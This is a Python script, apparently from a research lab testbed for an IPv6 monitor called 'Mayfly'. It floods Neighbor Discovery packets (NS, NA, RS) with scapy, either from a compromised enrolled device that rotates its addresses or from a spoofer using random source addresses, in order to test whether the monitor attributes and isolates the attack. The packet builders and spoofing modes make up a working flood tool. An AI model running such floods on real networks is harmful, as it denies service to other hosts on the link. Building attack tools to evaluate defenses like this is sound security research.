#!/usr/bin/env python3
"""A2 NS/NA/RS flood (PRD S4/S5, threats T2/T3).

Modes:
  rotating  a COMPROMISED ENROLLED device (S4, T2). Enrolls with the monitor,
            then floods NS while minting a fresh resolvable address every
            --rotate seconds. Every packet still resolves to its one pseudonym,
            so Mayfly attributes the whole flood to one label however fast it
            rotates -- the headline result versus a per-address baseline.
  spoof     an UNENROLLED spoofer (S5, T3). Random source IIDs that resolve to
            nothing; the monitor counts them per ingress port and isolates.
  follow    flood from whatever global address the emulator currently gives this
            device (use when lab/rotation.py drives the device's rotation).
  fixed     flood from a single --source address.

  sudo ip netns exec d1 .venv/bin/python -m attacks.ndp_flood rotating \
       --tenant A --rotate 1 --rate 200 --duration 60 \
       --monitor /run/mayfly-lab/monitor.sock
"""

from __future__ import annotations

import argparse
import os
import sys
import time
from typing import Callable, List, Optional

from attacks.common import (IFACE, ensure_lab_namespace, hwaddr, preferred_global,
                            run_rate_limited)

from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6ND_NS, ICMPv6ND_RS, IPv6
from scapy.layers.l2 import Ether

from mayfly.identity import DeviceEnrollment, DeviceIdentity, join_address, prefix_from_network

LAB_PREFIX = "fd4d:6179:666c:1::/64"
DEFAULT_SOCKET = "/run/mayfly-lab/monitor.sock"
TARGET_BASE = "fd4d:6179:666c:1::"


def build_ns(src: str, target: str, mac: str) -> bytes:
    return bytes(Ether(src=mac, dst="33:33:ff:00:00:01") /
                 IPv6(src=src, dst="ff02::1:ff00:1", hlim=255) / ICMPv6ND_NS(tgt=target))


def build_na(src: str, target: str, mac: str) -> bytes:
    return bytes(Ether(src=mac, dst="33:33:00:00:00:01") /
                 IPv6(src=src, dst="ff02::1", hlim=255) / ICMPv6ND_NA(tgt=target, R=0, S=0, O=1))


def build_rs(src: str, mac: str) -> bytes:
    return bytes(Ether(src=mac, dst="33:33:00:00:00:02") /
                 IPv6(src=src, dst="ff02::2", hlim=255) / ICMPv6ND_RS())


def _builder(kind: str, mac: str) -> Callable[[str, int], bytes]:
    if kind == "ns":
        return lambda src, k: build_ns(src, "%s%x" % (TARGET_BASE, k & 0xffff), mac)
    if kind == "na":
        return lambda src, k: build_na(src, src, mac)
    return lambda src, k: build_rs(src, mac)


def _random_source() -> str:
    return TARGET_BASE[:-1] + ":".join(os.urandom(8).hex()[i:i + 4] for i in range(0, 16, 4))


def enroll(monitor: str, tenant: str, rand=os.urandom) -> "tuple[str, DeviceIdentity]":
    """Compromised-but-enrolled device: a normal enrollment it then abuses."""
    from mayfly.enrollsvc import EnrollClient
    with EnrollClient(monitor) as client:
        token, params = client.issue_token(tenant)
        dev = DeviceEnrollment(token, rand)
        confirm, k0 = dev.finish(client.hello(dev.hello()))
        label = client.confirm(confirm)
    return label, DeviceIdentity(k0, time.monotonic(), params, rand)


def main(argv: Optional[List[str]] = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    ap.add_argument("mode", choices=("rotating", "spoof", "follow", "fixed"))
    ap.add_argument("--type", choices=("ns", "na", "rs"), default="ns")
    ap.add_argument("--iface", default=IFACE)
    ap.add_argument("--rate", type=float, default=100.0, help="packets/second")
    ap.add_argument("--duration", type=float, default=30.0)
    ap.add_argument("--rotate", type=float, default=1.0, help="rotating: seconds per address")
    ap.add_argument("--tenant", default="A", help="rotating: tenant to enroll with")
    ap.add_argument("--monitor", default=DEFAULT_SOCKET, help="rotating: enrollment socket")
    ap.add_argument("--source", default=None, help="fixed: source address")
    args = ap.parse_args(argv)
    ensure_lab_namespace(args.iface)
    mac = hwaddr(args.iface)
    make = _builder(args.type, mac)
    batch = max(1, int(args.rate // 10))

    if args.mode == "rotating":
        prefix = prefix_from_network(LAB_PREFIX)
        label, identity = enroll(args.monitor, args.tenant)
        start = time.monotonic()
        state = {"src": str(join_address(prefix, identity.new_iid(prefix, start))),
                 "next": start + args.rotate}
        print("compromised enrolled device: tenant=%s label=%s, rotating every %gs, %g pps %s"
              % (args.tenant, label, args.rotate, args.rate, args.type.upper()), file=sys.stderr)

        def make_batch(now: float) -> list:
            if now >= state["next"]:
                try:
                    state["src"] = str(join_address(prefix, identity.new_iid(prefix, now)))
                except Exception:          # session expired -> re-enroll
                    _, ident2 = enroll(args.monitor, args.tenant)
                    identity.__dict__.update(ident2.__dict__)
                    state["src"] = str(join_address(prefix, identity.new_iid(prefix, now)))
                state["next"] = now + args.rotate
            return [make(state["src"], k) for k in range(batch)]

    elif args.mode == "spoof":
        print("unenrolled spoofer: random source IIDs, %g pps %s" % (args.rate, args.type.upper()),
              file=sys.stderr)
        make_batch = lambda now: [make(_random_source(), k) for k in range(batch)]  # noqa: E731

    elif args.mode == "follow":
        def make_batch(now: float) -> list:
            src = preferred_global(args.iface)
            return [make(src, k) for k in range(batch)] if src else []
        print("flood following the device's rotating address, %g pps %s" % (args.rate, args.type.upper()),
              file=sys.stderr)

    else:  # fixed
        src = args.source or preferred_global(args.iface)
        if not src:
            ap.error("fixed mode needs --source (no global address on %s)" % args.iface)
        make_batch = lambda now: [make(src, k) for k in range(batch)]  # noqa: E731
        print("flood from fixed source %s, %g pps %s" % (src, args.rate, args.type.upper()),
              file=sys.stderr)

    run_rate_limited(args.duration, args.rate, make_batch, args.iface, batch=batch,
                     label="ndp_flood " + args.mode)
    return 0


if __name__ == "__main__":
    sys.exit(main())
